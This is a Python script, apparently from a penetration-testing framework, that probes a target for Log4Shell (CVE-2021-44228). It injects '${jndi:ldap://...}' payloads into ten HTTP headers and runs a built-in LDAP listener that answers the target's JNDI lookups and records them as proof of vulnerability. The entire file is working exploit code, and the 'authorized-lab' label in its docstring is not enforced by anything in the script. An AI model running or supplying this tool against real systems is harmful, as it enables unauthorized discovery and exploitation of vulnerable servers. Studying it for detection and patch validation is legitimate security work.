#!/usr/bin/env python3
"""CVE-2021-44228 (Log4Shell) - authorized-lab deploy payload.

JNDI injection via HTTP header probes with an out-of-band LDAP callback
listener running on a background thread. The listener speaks enough BER/ LDAP
(bind response + search response) for the victim's JNDI runtime to complete a
lookup, and captures the search base DN (which carries our per-header marker)
as forensic evidence.
"""
import argparse
import json
import socket
import sys
import threading
import time

import requests

PROBE_HEADERS = [
    "User-Agent",
    "X-Api-Version",
    "X-Forwarded-For",
    "Referer",
    "Authorization",
    "Cookie",
    "X-Requested-With",
    "Accept-Language",
    "X-Client-IP",
    "Origin",
]


def detect_source_ip(target):
    """Best-effort local IP as seen from the target network (UDP no-send trick)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 9))
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        return "127.0.0.1"


def read_tlv(data):
    """Parse one BER TLV. Returns (tag, value, rest) or None when incomplete."""
    if len(data) < 2:
        return None
    length = data[1]
    idx = 2
    if length & 0x80:
        n = length & 0x7F
        if n == 0 or len(data) < 2 + n:
            return None
        length = int.from_bytes(data[2:2 + n], "big")
        idx = 2 + n
    if len(data) < idx + length:
        return None
    return data[0], data[idx:idx + length], data[idx + length:]


def ldap_bind_response(msgid):
    body = bytes([0x61, 0x07, 0x0A, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00])
    inner = bytes([0x02, len(msgid)]) + msgid + body
    return bytes([0x30, len(inner)]) + inner


def ldap_search_done_response(msgid):
    body = bytes([0x65, 0x07, 0x0A, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00])
    inner = bytes([0x02, len(msgid)]) + msgid + body
    return bytes([0x30, len(inner)]) + inner


class LdapCallbackListener(threading.Thread):
    """Minimal LDAP responder used purely as a JNDI out-of-band callback sink."""

    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.callbacks = []
        self._lock = threading.Lock()
        self._sock = None
        self._stop = threading.Event()

    def run(self):
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((self.host, self.port))
            srv.listen(8)
            srv.settimeout(1.0)
            self._sock = srv
        except OSError:
            return
        while not self._stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(conn, addr), daemon=True).start()

    def _handle(self, conn, addr):
        record = {"peer": "%s:%d" % addr[0:2], "time": time.time(), "base_dn": None, "raw": ""}
        with self._lock:
            self.callbacks.append(record)
        conn.settimeout(3.0)
        buf = b""
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                buf += data
                while True:
                    tlv = read_tlv(buf)
                    if tlv is None:
                        break
                    tag, value, buf = tlv
                    if tag != 0x30:
                        continue
                    inner = read_tlv(value)
                    if not inner:
                        continue
                    itag, ivalue, rest = inner
                    if itag != 0x02:
                        continue
                    msgid = ivalue
                    op = read_tlv(rest)
                    if not op:
                        continue
                    optag, opval, _ = op
                    if optag == 0x60:  # bindRequest
                        conn.sendall(ldap_bind_response(msgid))
                    elif optag == 0x63:  # searchRequest -> capture base DN
                        base = read_tlv(opval)
                        if base and base[0] == 0x04:
                            record["base_dn"] = base[1].decode("latin-1")
                        conn.sendall(ldap_search_done_response(msgid))
                    elif optag == 0x42:  # abandon / disconnect
                        return
                    record["raw"] = value.hex()[:128]
        except (socket.timeout, OSError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def stop(self):
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def snapshot(self):
        with self._lock:
            return list(self.callbacks)


def run(args):
    result = {
        "cve": "CVE-2021-44228",
        "target": "%s:%d%s" % (args.target, args.port, args.path),
        "vulnerable": False,
        "verified_by": None,
        "callback_host": args.callback_host,
        "callback_port": args.callback_port,
        "probes": [],
        "callbacks": [],
        "error": None,
    }
    listener = LdapCallbackListener("0.0.0.0", args.callback_port)
    listener.start()
    time.sleep(0.3)

    try:
        for i, header in enumerate(PROBE_HEADERS):
            marker = "lg4j_%02d" % i
            payload = "${jndi:ldap://%s:%d/%s}" % (args.callback_host, args.callback_port, marker)
            probe = {"header": header, "marker": marker, "payload": payload, "status": None, "error": None}
            result["probes"].append(probe)
            try:
                r = requests.get(
                    "http://%s:%d%s" % (args.target, args.port, args.path),
                    headers={header: payload},
                    timeout=args.timeout,
                )
                probe["status"] = r.status_code
            except requests.exceptions.RequestException as exc:
                probe["error"] = "%s: %s" % (type(exc).__name__, exc)

        deadline = time.time() + args.callback_wait
        while time.time() < deadline:
            callbacks = listener.snapshot()
            if callbacks:
                break
            time.sleep(0.5)
        result["callbacks"] = listener.snapshot()
        if result["callbacks"]:
            result["vulnerable"] = True
            result["verified_by"] = "out-of-band LDAP callback (JNDI lookup reached attacker listener)"
            for cb in result["callbacks"]:
                if cb.get("base_dn"):
                    result["verified_by"] += "; base DN marker: %s" % cb["base_dn"]
                    break
        return result
    finally:
        listener.stop()


def main():
    p = argparse.ArgumentParser(description="CVE-2021-44228 Log4Shell authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--timeout", type=float, default=10.0, help="per-request HTTP timeout (s)")
    p.add_argument("--path", default="/", help="HTTP path to probe")
    p.add_argument("--callback-host", default=None, help="IP the target should call back to (default: auto-detect)")
    p.add_argument("--callback-port", type=int, default=1389, help="local LDAP listener port")
    p.add_argument("--callback-wait", type=float, default=12.0, help="seconds to wait for JNDI callbacks")
    args = p.parse_args()
    if args.callback_host is None:
        args.callback_host = detect_source_ip(args.target)
    try:
        result = run(args)
    except Exception as exc:  # defensive: deploy must never crash the operator console
        result = {
            "cve": "CVE-2021-44228",
            "target": "%s:%d" % (args.target, args.port),
            "vulnerable": False,
            "error": "%s: %s" % (type(exc).__name__, exc),
        }
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
